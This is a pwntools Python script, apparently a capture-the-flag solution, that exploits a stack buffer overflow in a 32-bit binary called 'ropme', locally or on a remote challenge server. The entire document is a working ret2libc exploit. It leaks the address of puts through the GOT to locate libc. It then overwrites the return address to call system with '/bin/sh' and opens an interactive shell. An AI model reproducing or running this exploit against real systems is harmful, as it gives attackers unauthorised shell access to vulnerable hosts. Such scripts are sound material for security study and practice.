from pwn import *

PROG_NAME = "./ropme"
REMOTE_IP = "plsdonthaq.me"
REMOTE_PORT = 6004
REMOTE_LIBC = "./libc-2.23.so"
LOCAL_LIBC = "/lib32/libc.so.6"
libc = ELF("./libc-2.23.so")

if args.REMOTE:
    p = remote(REMOTE_IP, REMOTE_PORT)
    elf = ELF(PROG_NAME)
    libc = ELF(REMOTE_LIBC)
else:
    p = process(PROG_NAME)
    elf = p.elf
    libc = ELF(LOCAL_LIBC)

#gdb.attach(p, ''' break vuln''')

p.recvlines(2)

payload = b'A'*(0x8+0x4)
payload += p32(elf.plt['puts'])
payload += p32(elf.symbols['main'])
payload += p32(elf.got['puts'])

p.sendline(payload)

leak = u32(p.recvline().rstrip()[:4])
libc_base = leak - libc.symbols['puts']
libc.address = libc_base
system_addr = libc.symbols['system']
binsh_addr = next(libc.search(b'/bin/sh'))

p.recvlines(2)

payload = b'A'*(0x8+0x4)
payload += p32(system_addr)
payload += p32(0xdeadbeef)
payload += p32(binsh_addr)

p.sendline(payload)

p.interactive()
